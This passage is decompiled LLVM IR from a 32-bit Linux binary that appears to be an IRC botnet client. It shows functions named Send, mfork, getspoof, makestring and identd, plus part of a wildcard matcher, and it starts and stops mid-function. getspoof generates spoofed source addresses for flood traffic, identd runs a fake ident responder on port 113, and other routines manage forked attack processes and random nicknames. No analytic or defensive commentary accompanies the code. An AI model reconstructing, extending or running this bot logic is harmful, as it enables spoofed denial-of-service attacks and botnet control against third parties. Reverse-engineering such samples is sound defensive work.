  br i1 %v1_80481f4, label %dec_label_pc_8048201, label %dec_label_pc_8048208

dec_label_pc_8048201:                             ; preds = %dec_label_pc_80481e1, %dec_label_pc_80481c1
  br label %dec_label_pc_8048208

dec_label_pc_8048208:                             ; preds = %dec_label_pc_80481d8, %dec_label_pc_80481e1, %dec_label_pc_8048201
  %storemerge7 = phi i32 [ 0, %dec_label_pc_8048201 ], [ 1, %dec_label_pc_80481e1 ], [ 1, %dec_label_pc_80481d8 ]
  br label %dec_label_pc_80482aa

dec_label_pc_8048213:                             ; preds = %dec_label_pc_80481a0
  %v2_8048216 = load i8, i8* %tmp13, align 1
  %v4_8048218 = icmp eq i8 %v2_8048216, 0
  br i1 %v4_8048218, label %dec_label_pc_8048245, label %dec_label_pc_804821c

dec_label_pc_804821c:                             ; preds = %dec_label_pc_8048213
  %v1_804821f = add i32 %arg2, 1
  %v1_8048223 = add i32 %v4_804818f, 1
  store i32 %v1_8048223, i32* @edx, align 4
  %v5_8048228 = inttoptr i32 %v1_8048223 to i8*
  %v5_8048229 = call i32 @strwildmatch(i8* %v5_8048228, i32 %v1_804821f)
  %v1_8048231 = icmp ne i32 %v5_8048229, 0
  %. = zext i1 %v1_8048231 to i32
  br label %dec_label_pc_8048245

dec_label_pc_8048245:                             ; preds = %dec_label_pc_804821c, %dec_label_pc_8048213
  %storemerge4 = phi i32 [ 1, %dec_label_pc_8048213 ], [ %., %dec_label_pc_804821c ]
  br label %dec_label_pc_80482aa

dec_label_pc_804824d:                             ; preds = %dec_label_pc_80481a6
  %v2_8048250 = load i8, i8* %arg1, align 1
  %v2_8048252 = sext i8 %v2_8048250 to i32
  %v2_8048259 = call i32 @__GI_toupper(i32 %v2_8048252)
  store i32 %v2_8048259, i32* @ebx, align 4
  %v2_8048266 = load i8, i8* %tmp13, align 1
  %v2_8048268 = sext i8 %v2_8048266 to i32
  %v2_804826f = call i32 @__GI_toupper(i32 %v2_8048268)
  %v0_8048277 = load i32, i32* @ebx, align 4
  %v12_8048277 = icmp eq i32 %v0_8048277, %v2_804826f
  %v1_8048279 = icmp eq i1 %v12_8048277, false
  br i1 %v1_8048279, label %dec_label_pc_80482a4, label %dec_label_pc_804827b

dec_label_pc_804827b:                             ; preds = %dec_label_pc_804824d
  %v1_804827e = add i32 %arg2, 1
  %v1_8048282 = add i32 %v4_804818f, 1
  store i32 %v1_8048282, i32* @edx, align 4
  %v5_8048287 = inttoptr i32 %v1_8048282 to i8*
  %v5_8048288 = call i32 @strwildmatch(i8* %v5_8048287, i32 %v1_804827e)
  %v1_8048290 = icmp ne i32 %v5_8048288, 0
  %.8 = zext i1 %v1_8048290 to i32
  br label %dec_label_pc_80482a4

dec_label_pc_80482a4:                             ; preds = %dec_label_pc_804827b, %dec_label_pc_804824d
  %storemerge = phi i32 [ 1, %dec_label_pc_804824d ], [ %.8, %dec_label_pc_804827b ]
  br label %dec_label_pc_80482aa

dec_label_pc_80482aa:                             ; preds = %dec_label_pc_8048245, %dec_label_pc_8048208, %dec_label_pc_80481b1, %dec_label_pc_80482a4
  %stack_var_-24.0 = phi i32 [ %storemerge7, %dec_label_pc_8048208 ], [ %storemerge4, %dec_label_pc_8048245 ], [ %v2_80481b6, %dec_label_pc_80481b1 ], [ %storemerge, %dec_label_pc_80482a4 ]
  %v3_80482ad = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_80482ad, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048192, { 2, 0, 1 }
  uselistorder i32 %v4_804818f, { 0, 2, 1 }
  uselistorder i8* %tmp13, { 3, 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_toupper, { 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 2, 1, 4 }
  uselistorder i8* %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_80482aa, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048208, { 2, 1, 0 }
}

define i32 @Send(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %v0_80482b5 = load i32, i32* @edi, align 4
  %v4_80482bc = ptrtoint i32* %stack_var_12 to i32
  %v5_80482ce = call i32 @vsprintf(i32 ptrtoint (i8** @global_var_8062aa0.26 to i32), i32 %arg2, i32 %v4_80482bc)
  store i1 false, i1* @df, align 1
  store i32 ptrtoint (i8** @global_var_8062aa0.26 to i32), i32* @edi, align 4
  %v3_80482e9 = call i32 @_strlen(i8* bitcast (i8** @global_var_8062aa0.26 to i8*))
  %v4_80482e9 = mul i32 %v3_80482e9, -1
  %v5_80482e9 = add i32 %v4_80482e9, -2
  store i32 %v5_80482e9, i32* @ecx, align 4
  %v1_80482ef = sub i32 0, %v4_80482e9
  %v5_80482fc = call i32 @write(i32 %arg1, i32 ptrtoint (i8** @global_var_8062aa0.26 to i32), i32 %v1_80482ef)
  store i32 %v0_80482b5, i32* @edi, align 4
  ret i32 %v5_80482fc
}

define i32 @mfork(i32 %arg1) local_unnamed_addr {
entry:
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v0_804830f = load i8, i8* @global_var_8062a84.27, align 4
  %v10_8048314 = icmp eq i8 %v0_804830f, 1
  %v1_8048316 = icmp eq i1 %v10_8048314, false
  br i1 %v1_8048316, label %dec_label_pc_804833d, label %dec_label_pc_8048318

dec_label_pc_8048318:                             ; preds = %entry
  %v0_8048318 = load i32, i32* @global_var_8067528.28, align 8
  %v3_8048329 = call i32 @Send(i32 %v0_8048318, i32 ptrtoint ([30 x i8]* @global_var_805a321.29 to i32))
  br label %dec_label_pc_80483e3

dec_label_pc_804833d:                             ; preds = %entry
  %v1_804833d = call i32 @fork(i32 %tmp4)
  %v4_8048345 = icmp eq i32 %v1_804833d, 0
  %v1_8048349 = icmp eq i1 %v4_8048345, false
  br i1 %v1_8048349, label %dec_label_pc_8048356, label %dec_label_pc_804834b

dec_label_pc_804834b:                             ; preds = %dec_label_pc_804833d
  br label %dec_label_pc_80483e3

dec_label_pc_8048356:                             ; preds = %dec_label_pc_804833d
  %v0_8048356 = load i32, i32* @global_var_8062a90.30, align 16
  %v1_804835b = add i32 %v0_8048356, 1
  store i32 %v1_804835b, i32* @global_var_8062a90.30, align 16
  %v2_8048366 = mul i32 %v1_804835b, 4
  %v1_8048369 = add i32 %v2_8048366, 4
  %v1_8048370 = call i32 @malloc(i32 %v1_8048369)
  %v0_80483a613 = load i32, i32* @global_var_8062a90.30, align 16
  %v6_80483af15 = icmp eq i32 %v0_80483a613, 1
  br i1 %v6_80483af15, label %dec_label_pc_80483b1, label %dec_label_pc_8048384

dec_label_pc_8048384:                             ; preds = %dec_label_pc_8048356, %dec_label_pc_8048384
  %storemerge16 = phi i32 [ %v4_80483a3, %dec_label_pc_8048384 ], [ 0, %dec_label_pc_8048356 ]
  %v2_8048387 = mul i32 %storemerge16, 4
  %v5_804838c = add i32 %v2_8048387, %v1_8048370
  store i32 %v5_804838c, i32* @ecx, align 4
  %v0_8048397 = load i32, i32* @global_var_806764c.31, align 4
  %v2_804839c = add i32 %v0_8048397, %v2_8048387
  %v1_804839f = inttoptr i32 %v2_804839c to i32*
  %v2_804839f = load i32, i32* %v1_804839f, align 4
  %v2_80483a1 = inttoptr i32 %v5_804838c to i32*
  store i32 %v2_804839f, i32* %v2_80483a1, align 4
  %v4_80483a3 = add i32 %storemerge16, 1
  %v0_80483a6 = load i32, i32* @global_var_8062a90.30, align 16
  %v1_80483ab = add i32 %v0_80483a6, -1
  %v6_80483af = icmp ugt i32 %v1_80483ab, %v4_80483a3
  br i1 %v6_80483af, label %dec_label_pc_8048384, label %dec_label_pc_80483b1

dec_label_pc_80483b1:                             ; preds = %dec_label_pc_8048384, %dec_label_pc_8048356
  %v0_80483a6.lcssa = phi i32 [ %v0_80483a613, %dec_label_pc_8048356 ], [ %v0_80483a6, %dec_label_pc_8048384 ]
  %v2_80483b6 = mul i32 %v0_80483a6.lcssa, 4
  %v5_80483b9 = add i32 %v1_8048370, -4
  %v1_80483bc = add i32 %v5_80483b9, %v2_80483b6
  %v2_80483c2 = inttoptr i32 %v1_80483bc to i32*
  store i32 %v1_804833d, i32* %v2_80483c2, align 4
  %v0_80483c4 = load i32, i32* @global_var_806764c.31, align 4
  %v1_80483cd = call i32 @free(i32 %v0_80483c4)
  store i32 %v1_8048370, i32* @global_var_806764c.31, align 4
  br label %dec_label_pc_80483e3

dec_label_pc_80483e3:                             ; preds = %dec_label_pc_804834b, %dec_label_pc_8048318, %dec_label_pc_80483b1
  %stack_var_-24.0 = phi i32 [ %v1_804833d, %dec_label_pc_80483b1 ], [ %v1_804833d, %dec_label_pc_804834b ], [ 1, %dec_label_pc_8048318 ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v4_80483a3, { 1, 0 }
  uselistorder i32 %v2_8048387, { 1, 0 }
  uselistorder i32 %storemerge16, { 1, 0 }
  uselistorder i32 %v0_80483a613, { 1, 0 }
  uselistorder i32 %v1_8048370, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80483e3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8048384, { 1, 0 }
}

define i32 @getspoof() local_unnamed_addr {
entry:
  %v0_80483ee = load i8*, i8** @global_var_8062a88.32, align 4
  %v1_80483ee = ptrtoint i8* %v0_80483ee to i32
  %v2_80483f3 = icmp eq i8* %v0_80483ee, null
  %v1_80483f5 = icmp eq i1 %v2_80483f3, false
  br i1 %v1_80483f5, label %dec_label_pc_8048401, label %dec_label_pc_80483f7

dec_label_pc_80483f7:                             ; preds = %entry
  %v0_80483f7 = call i32 @random()
  br label %dec_label_pc_8048452

dec_label_pc_8048401:                             ; preds = %entry
  %v0_8048401 = load i64, i64* @global_var_8062a8c.33, align 8
  %v1_8048401 = trunc i64 %v0_8048401 to i32
  %v9_8048406 = icmp eq i32 %v1_8048401, 1
  %v1_8048409 = icmp eq i1 %v9_8048406, false
  br i1 %v1_8048409, label %dec_label_pc_8048421, label %dec_label_pc_804840b

dec_label_pc_804840b:                             ; preds = %dec_label_pc_8048401
  %v2_8048414 = call i32 @ntohl(i32 %v1_80483ee)
  br label %dec_label_pc_8048452

dec_label_pc_8048421:                             ; preds = %dec_label_pc_8048401
  %v0_8048421 = call i32 @random()
  %v0_8048428 = load i64, i64* @global_var_8062a8c.33, align 8
  %sext = mul i64 %v0_8048428, 4294967296
  %v5_804842d = sdiv i64 %sext, 4294967296
  %v6_8048437 = zext i32 %v0_8048421 to i64
  %v14_8048437 = urem i64 %v6_8048437, %v5_804842d
  %v15_8048437 = trunc i64 %v14_8048437 to i32
  %v0_804843a = load i8*, i8** @global_var_8062a88.32, align 4
  %v1_804843a = ptrtoint i8* %v0_804843a to i32
  %v2_804843f = add i32 %v15_8048437, 1
  %v1_8048442 = add i32 %v2_804843f, %v1_804843a
  %v2_8048447 = call i32 @ntohl(i32 %v1_8048442)
  br label %dec_label_pc_8048452

dec_label_pc_8048452:                             ; preds = %dec_label_pc_804840b, %dec_label_pc_80483f7, %dec_label_pc_8048421
  %stack_var_-8.0 = phi i32 [ %v2_8048447, %dec_label_pc_8048421 ], [ %v2_8048414, %dec_label_pc_804840b ], [ %v0_80483f7, %dec_label_pc_80483f7 ]
  ret i32 %stack_var_-8.0

; uselistorder directives
  uselistorder i32 (i32)* @ntohl, { 1, 0 }
  uselistorder label %dec_label_pc_8048452, { 2, 0, 1 }
}

define i32 @filter(i8* %arg1) local_unnamed_addr {
entry:
  %v4_804847f = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_804847f

dec_label_pc_8048460:                             ; preds = %dec_label_pc_80484a1, %dec_label_pc_804847f
  %v3_8048471 = call i32 @_strlen(i8* %arg1)
  %v6_8048478 = add i32 %v4_804847f, %v3_8048471
  %v1_804847b = add i32 %v6_8048478, -1
  %v1_804847c = inttoptr i32 %v1_804847b to i8*
  store i8 0, i8* %v1_804847c, align 1
  br label %dec_label_pc_804847f

dec_label_pc_804847f:                             ; preds = %entry, %dec_label_pc_8048460
  %v3_8048490 = call i32 @_strlen(i8* %arg1)
  %v6_8048497 = add i32 %v4_804847f, %v3_8048490
  %v1_804849a = add i32 %v6_8048497, -1
  %v1_804849b = inttoptr i32 %v1_804849a to i8*
  %v2_804849b = load i8, i8* %v1_804849b, align 1
  %v10_804849d = icmp eq i8 %v2_804849b, 13
  br i1 %v10_804849d, label %dec_label_pc_8048460, label %dec_label_pc_80484a1

dec_label_pc_80484a1:                             ; preds = %dec_label_pc_804847f
  %v3_80484b2 = call i32 @_strlen(i8* %arg1)
  %v6_80484b9 = add i32 %v4_804847f, %v3_80484b2
  %v1_80484bc = add i32 %v6_80484b9, -1
  %v1_80484bd = inttoptr i32 %v1_80484bc to i8*
  %v2_80484bd = load i8, i8* %v1_80484bd, align 1
  %v11_80484bf = icmp eq i8 %v2_80484bd, 10
  br i1 %v11_80484bf, label %dec_label_pc_8048460, label %dec_label_pc_80484c3

dec_label_pc_80484c3:                             ; preds = %dec_label_pc_80484a1
  %v1_80484c8 = sext i8 %v2_80484bd to i32
  ret i32 %v1_80484c8

; uselistorder directives
  uselistorder i32 %v4_804847f, { 1, 2, 0 }
  uselistorder i8* %arg1, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804847f, { 1, 0 }
}

define i32 @makestring() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i8*, align 4
  %stack_var_-1060 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80484cc = load i32, i32* @edi, align 4
  %v0_80484cd = load i32, i32* @esi, align 4
  %v0_80484ce = load i32, i32* @ebx, align 4
  store i32 %v0_80484ce, i32* %stack_var_-16, align 4
  %v1_80484d5 = call i32 @random()
  store i32 5, i32* @ecx, align 4
  %v2_80484e5 = ashr i32 %v1_80484d5, 31
  %v2_80484e8 = zext i32 %v1_80484d5 to i64
  %v4_80484e8 = zext i32 %v2_80484e5 to i64
  %v5_80484e8 = mul nuw i64 %v4_80484e8, 4294967296
  %v6_80484e8 = or i64 %v5_80484e8, %v2_80484e8
  %v10_80484e8 = srem i64 %v6_80484e8, 5
  %v11_80484e8 = trunc i64 %v10_80484e8 to i32
  %v1_80484ec = add i32 %v11_80484e8, 4
  %v1_80484f5 = add i32 %v11_80484e8, 5
  %v2_80484fa = call i32 @malloc(i32 %v1_80484f5)
  %tmp21 = bitcast i8** %stack_var_-36 to i32*
  store i32 %v2_80484fa, i32* %tmp21, align 4
  %tmp22 = inttoptr i32 %v2_80484fa to i8*
  store i32 %v2_80484fa, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8048513 = and i32 %v2_80484fa, -256
  store i32 %v1_8048513, i32* @eax, align 4
  %v5_8048515 = call i8* @_memset(i8* %tmp22, i32 %v1_8048513, i32 %v1_80484f5)
  %v6_8048515 = ptrtoint i8* %v5_8048515 to i32
  store i32 %v6_8048515, i32* @ecx, align 4
  %v3_8048524 = call i32 @__GI_fopen(i32 ptrtoint ([16 x i8]* @global_var_805a341.35 to i32), i32 ptrtoint ([2 x i8]* @global_var_805a33f.34 to i32))
  %v4_804852f = icmp eq i32 %v3_8048524, 0
  %v1_8048533 = icmp eq i1 %v4_804852f, false
  br i1 %v1_8048533, label %dec_label_pc_8048572, label %dec_label_pc_8048565.preheader

dec_label_pc_8048565.preheader:                   ; preds = %entry
  %v5_804856b37 = icmp sgt i32 %v1_80484ec, 0
  br i1 %v5_804856b37, label %dec_label_pc_804853e, label %dec_label_pc_804862b

dec_label_pc_804853e:                             ; preds = %dec_label_pc_804853e, %dec_label_pc_8048565.preheader
  %v4_8048543 = phi i8* [ %tmp22, %dec_label_pc_8048565.preheader ], [ %v3_804862b.pre.pre, %dec_label_pc_804853e ]
  %storemerge38 = phi i32 [ 0, %dec_label_pc_8048565.preheader ], [ %v4_8048562, %dec_label_pc_804853e ]
  %v5_8048543 = ptrtoint i8* %v4_8048543 to i32
  %v6_8048543 = add i32 %v5_8048543, %storemerge38
  store i32 %v6_8048543, i32* @ebx, align 4
  %v0_8048546 = call i32 @random()
  store i32 26, i32* @ecx, align 4
  %v2_8048556 = ashr i32 %v0_8048546, 31
  %v2_8048559 = zext i32 %v0_8048546 to i64
  %v4_8048559 = zext i32 %v2_8048556 to i64
  %v5_8048559 = mul nuw i64 %v4_8048559, 4294967296
  %v6_8048559 = or i64 %v5_8048559, %v2_8048559
  %v10_8048559 = srem i64 %v6_8048559, 26
  %v11_8048559 = trunc i64 %v10_8048559 to i8
  %v1_804855d = add i8 %v11_8048559, 65
  %v2_8048560 = load i32, i32* @ebx, align 4
  %v3_8048560 = inttoptr i32 %v2_8048560 to i8*
  store i8 %v1_804855d, i8* %v3_8048560, align 1
  %v4_8048562 = add nuw nsw i32 %storemerge38, 1
  %exitcond39 = icmp eq i32 %v4_8048562, %v1_80484ec
  %v3_804862b.pre.pre = load i8*, i8** %stack_var_-36, align 4
  br i1 %exitcond39, label %dec_label_pc_804862b, label %dec_label_pc_804853e

dec_label_pc_8048572:                             ; preds = %entry
  %v1_8048572 = call i32 @random()
  store i32 %v1_8048572, i32* @ebx, align 4
  %v0_8048579 = call i32 @random()
  %v1_8048579 = sext i32 %v0_8048579 to i64
  %v0_804857e = load i32, i32* @ebx, align 4
  %v3_8048580 = sext i32 %v0_804857e to i64
  %v5_8048580 = mul nsw i64 %v3_8048580, %v1_8048579
  %v6_8048580 = trunc i64 %v5_8048580 to i32
  store i32 45402, i32* @ecx, align 4
  %v2_804858c = ashr i32 %v6_8048580, 31
  %v2_804858f = and i64 %v5_8048580, 4294967295
  %v4_804858f = zext i32 %v2_804858c to i64
  %v5_804858f = mul nuw i64 %v4_804858f, 4294967296
  %v6_804858f = or i64 %v5_804858f, %v2_804858f
  %v10_804858f = srem i64 %v6_804858f, 45402
  %v11_804858f = trunc i64 %v10_804858f to i32
  store i32 %v11_804858f, i32* @edx, align 4
  %v1_8048593 = add i32 %v11_804858f, 1
  %v2_80485ab = ptrtoint i32* %stack_var_-1060 to i32
  %tmp23 = bitcast i32* %stack_var_-1060 to i8*
  %v5_80485c330 = icmp sgt i32 %v1_8048593, 0
  br i1 %v5_80485c330, label %dec_label_pc_80485a0, label %dec_label_pc_80485c5

dec_label_pc_80485a0:                             ; preds = %dec_label_pc_8048572, %dec_label_pc_80485a0
  %storemerge431 = phi i32 [ %v4_80485ba, %dec_label_pc_80485a0 ], [ 0, %dec_label_pc_8048572 ]
  %v4_80485b2 = call i32 @fgets(i32 %v2_80485ab, i32 1024, i32 %v3_8048524)
  %v4_80485ba = add nuw nsw i32 %storemerge431, 1
  %exitcond = icmp eq i32 %v4_80485ba, %v1_8048593
  br i1 %exitcond, label %dec_label_pc_80485c5, label %dec_label_pc_80485a0

dec_label_pc_80485c5:                             ; preds = %dec_label_pc_8048572, %dec_label_pc_80485a0
  store i32 %v2_80485ab, i32* @edx, align 4
  %v5_80485d9 = call i32 @__GI_memset(i8* %tmp23, i32 0, i32 1024)
  %v4_80485f3 = call i32 @fgets(i32 %v2_80485ab, i32 1024, i32 %v3_8048524)
  %v2_8048602 = call i32 @filter(i8* %tmp23)
  store i32 %v2_80484fa, i32* @edi, align 4
  store i32 %v2_80485ab, i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_804861b = call i8* @_memcpy(i8* %tmp22, i8* %tmp23, i32 %v1_80484ec)
  %v8_804861b = ptrtoint i8* %v7_804861b to i32
  store i32 %v8_804861b, i32* @ecx, align 4
  %tmp24 = inttoptr i32 %v3_8048524 to i16*
  %v3_8048623 = call i32 @__GI_fclose(i16* %tmp24)
  br label %dec_label_pc_804862b

dec_label_pc_804862b:                             ; preds = %dec_label_pc_804853e, %dec_label_pc_8048565.preheader, %dec_label_pc_80485c5
  %v3_804862b = phi i8* [ %tmp22, %dec_label_pc_80485c5 ], [ %tmp22, %dec_label_pc_8048565.preheader ], [ %v3_804862b.pre.pre, %dec_label_pc_804853e ]
  %v4_804862b = ptrtoint i8* %v3_804862b to i32
  %v2_8048631 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8048631, i32* @ebx, align 4
  store i32 %v0_80484cd, i32* @esi, align 4
  store i32 %v0_80484cc, i32* @edi, align 4
  ret i32 %v4_804862b

; uselistorder directives
  uselistorder i32 %v4_80485ba, { 1, 0 }
  uselistorder i8* %tmp23, { 2, 1, 0 }
  uselistorder i32 %v2_80485ab, { 2, 1, 0, 3 }
  uselistorder i32 %v4_8048562, { 1, 0 }
  uselistorder i32 %v3_8048524, { 2, 1, 0, 3 }
  uselistorder i8* %tmp22, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_80484f5, { 1, 0 }
  uselistorder i32 %v1_80484ec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804862b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80485c5, { 1, 0 }
  uselistorder label %dec_label_pc_80485a0, { 1, 0 }
}

define i32 @identd() local_unnamed_addr {
entry:
  %stack_var_-1092 = alloca i32, align 4
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1228 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-1260 = alloca i32, align 4
  store i32 2, i32* %stack_var_-1260, align 4
  %v3_8048649 = call i32 @socket(i32 2, i32 1, i32 0)
  %v13_8048654 = icmp eq i32 %v3_8048649, -1
  br i1 %v13_8048654, label %dec_label_pc_8048873, label %dec_label_pc_804865e

dec_label_pc_804865e:                             ; preds = %entry
  store i32 2, i32* %stack_var_-52, align 4
  store i32 113, i32* %stack_var_-1260, align 4
  %v1_8048669 = call i32 @htons(i32 113)
  %v2_804867c = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v3_8048649, i32* %stack_var_-1260, align 4
  %v3_804869b = call i32 @bind(i32 %v3_8048649, i32 %v2_804867c, i32 16)
  %v10_80486a3 = icmp eq i32 %v3_804869b, -1
  br i1 %v10_80486a3, label %dec_label_pc_8048873, label %dec_label_pc_80486ac

dec_label_pc_80486ac:                             ; preds = %dec_label_pc_804865e
  store i32 %v3_8048649, i32* %stack_var_-1260, align 4
  %v2_80486b4 = call i32 @listen(i32 %v3_8048649, i32 1)
  %v10_80486bc = icmp eq i32 %v2_80486b4, -1
  br i1 %v10_80486bc, label %dec_label_pc_8048873, label %dec_label_pc_80486c5

dec_label_pc_80486c5:                             ; preds = %dec_label_pc_80486ac
  %v0_80486c5 = load i32, i32* %stack_var_-1260, align 4
  %v1_80486c5 = call i32 @fork(i32 %v0_80486c5)
  %v1_80486ca = icmp eq i32 %v1_80486c5, 0
  br i1 %v1_80486ca, label %dec_label_pc_8048873, label %dec_label_pc_80486d2

dec_label_pc_80486d2:                             ; preds = %dec_label_pc_80486c5
  store i32 16, i32* %stack_var_-36, align 4
  %v2_80486d9 = ptrtoint i32* %stack_var_-36 to i32
  %v2_80486dc = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v3_8048649, i32* %stack_var_-1260, align 4
  %v3_80486e7 = call i32 @accept(i32 %v3_8048649, i32 %v2_80486dc, i32 %v2_80486d9)
  %v4_80486f2 = add i32 %v3_80486e7, 1
  %v13_80486f2 = icmp eq i32 %v4_80486f2, 0
  %v1_80486f6 = icmp eq i1 %v13_80486f2, false
  br i1 %v1_80486f6, label %dec_label_pc_8048702.preheader, label %dec_label_pc_80486f8

dec_label_pc_80486f8:                             ; preds = %dec_label_pc_80486d2
  store i32 0, i32* %stack_var_-1260, align 4
  %v1_80486fd = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048702.preheader

dec_label_pc_8048702.preheader:                   ; preds = %dec_label_pc_80486f8, %dec_label_pc_80486d2
  %v2_804870c = ptrtoint i32* %stack_var_-1228 to i32
  %tmp37 = bitcast i32* %stack_var_-1228 to i8*
  %v2_8048720 = udiv i32 %v3_80486e7, 32
  %v1_8048726 = urem i32 %v3_80486e7, 32
  %v9_8048729 = shl i32 1, %v1_8048726
  %v2_804874e = ptrtoint i32* %stack_var_-1100 to i32
  %v2_8048785 = mul nuw nsw i32 %v2_8048720, 4
  %v3_8048785 = add nsw i32 %v2_8048785, -1224
  br label %dec_label_pc_8048702

dec_label_pc_8048702:                             ; preds = %dec_label_pc_8048702.preheader, %dec_label_pc_8048777
  store i32 %v2_804870c, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8048713 = call i8* @_memset(i8* %tmp37, i32 0, i32 32)
  %v0_8048729 = load i32, i32* @ebp, align 4
  %v4_8048729 = add i32 %v3_8048785, %v0_8048729
  %v5_8048729 = inttoptr i32 %v4_8048729 to i32*
  %v6_8048729 = load i32, i32* %v5_8048729, align 4
  %v12_8048729 = or i32 %v6_8048729, %v9_8048729
  store i32 %v12_8048729, i32* %v5_8048729, align 4
  store i32 60, i32* %stack_var_-1100, align 4
  %v5_8048761 = call i32 @__libc_select(i32 %v4_80486f2, i32 %v2_804870c, i32 0, i32 0, i32 %v2_804874e)
  %v2_8048769 = icmp slt i32 %v5_8048761, 0
  %v1_804876b = icmp eq i1 %v2_8048769, false
  br i1 %v1_804876b, label %dec_label_pc_8048777, label %dec_label_pc_804876d

dec_label_pc_804876d:                             ; preds = %dec_label_pc_8048702
  %v1_8048772 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048777

dec_label_pc_8048777:                             ; preds = %dec_label_pc_8048702, %dec_label_pc_804876d
  %v0_8048785 = load i32, i32* @ebp, align 4
  %v4_8048785 = add i32 %v3_8048785, %v0_8048785
  %v5_8048785 = inttoptr i32 %v4_8048785 to i32*
  %v6_8048785 = load i32, i32* %v5_8048785, align 4
  %v10_8048785 = and i32 %v6_8048785, %v9_8048729
  %v11_8048785 = icmp ne i32 %v10_8048785, 0
  %v4_8048790 = icmp eq i1 %v11_8048785, false
  %v1_8048792 = icmp eq i1 %v4_8048790, false
  br i1 %v1_8048792, label %dec_label_pc_8048799, label %dec_label_pc_8048702

dec_label_pc_8048799:                             ; preds = %dec_label_pc_8048777
  %v2_80487a0 = ptrtoint i32* %stack_var_-1092 to i32
  %v4_80487aa = call i32 @recv(i32 %v3_80486e7, i32 %v2_80487a0, i32 1024, i32 0)
  %tmp38 = icmp slt i32 %v4_80487aa, 1
  br i1 %tmp38, label %dec_label_pc_80487c1, label %dec_label_pc_80487bb

dec_label_pc_80487bb:                             ; preds = %dec_label_pc_8048799
  %v7_80487bf = icmp sgt i32 %v4_80487aa, 19
  br i1 %v7_80487bf, label %dec_label_pc_80487c1, label %dec_label_pc_80487cb

dec_label_pc_80487c1:                             ; preds = %dec_label_pc_80487bb, %dec_label_pc_8048799
  %v1_80487c6 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80487cb

dec_label_pc_80487cb:                             ; preds = %dec_label_pc_80487bb, %dec_label_pc_80487c1
  %v0_80487ce = load i32, i32* @ebp, align 4
  %v2_80487ce = add i32 %v4_80487aa, -1088
  %v3_80487ce = add i32 %v2_80487ce, %v0_80487ce
  %v4_80487ce = inttoptr i32 %v3_80487ce to i8*
  store i8 0, i8* %v4_80487ce, align 1
  %v0_80487da = load i32, i32* @ebp, align 4
  %v2_80487da = add i32 %v4_80487aa, -1089
  %v3_80487da = add i32 %v2_80487da, %v0_80487da
  %v4_80487da = inttoptr i32 %v3_80487da to i8*
  %v5_80487da = load i8, i8* %v4_80487da, align 1
  %v10_80487e1 = icmp eq i8 %v5_80487da, 10
  br i1 %v10_80487e1, label %dec_label_pc_80487f4, label %dec_label_pc_80487e5

dec_label_pc_80487e5:                             ; preds = %dec_label_pc_80487cb
  %v5_80487e9 = load i8, i8* %v4_80487da, align 1
  %v10_80487f0 = icmp eq i8 %v5_80487e9, 13
  %v1_80487f2 = icmp eq i1 %v10_80487f0, false
  br i1 %v1_80487f2, label %dec_label_pc_8048800, label %dec_label_pc_80487f4

dec_label_pc_80487f4:                             ; preds = %dec_label_pc_80487e5, %dec_label_pc_80487cb
  store i8 0, i8* %v4_80487da, align 1
  %v0_8048806.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8048800

dec_label_pc_8048800:                             ; preds = %dec_label_pc_80487e5, %dec_label_pc_80487f4
  %v0_8048828 = phi i32 [ %v0_80487da, %dec_label_pc_80487e5 ], [ %v0_8048806.pre, %dec_label_pc_80487f4 ]
  %v2_8048806 = add i32 %v4_80487aa, -1090
  %v3_8048806 = add i32 %v2_8048806, %v0_8048828
  %v4_8048806 = inttoptr i32 %v3_8048806 to i8*
  %v5_8048806 = load i8, i8* %v4_8048806, align 1
  %v10_804880d = icmp eq i8 %v5_8048806, 10
  br i1 %v10_804880d, label %dec_label_pc_8048822, label %dec_label_pc_8048811

dec_label_pc_8048811:                             ; preds = %dec_label_pc_8048800
  %v5_8048817 = load i8, i8* %v4_8048806, align 1
  %v10_804881e = icmp eq i8 %v5_8048817, 13
  %v1_8048820 = icmp eq i1 %v10_804881e, false
  br i1 %v1_8048820, label %dec_label_pc_8048830, label %dec_label_pc_8048822

dec_label_pc_8048822:                             ; preds = %dec_label_pc_8048811, %dec_label_pc_8048800
  store i8 0, i8* %v4_8048806, align 1
  br label %dec_label_pc_8048830

dec_label_pc_8048830:                             ; preds = %dec_label_pc_8048811, %dec_label_pc_8048822
  %v3_8048845 = call i32 @Send(i32 %v3_80486e7, i32 ptrtoint ([25 x i8]* @global_var_805a351.37 to i32))
  %v1_8048853 = call i32 @close(i32 %v3_80486e7)
  %v1_8048861 = call i32 @close(i32 %v3_8048649)
  %v1_804886e = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048873

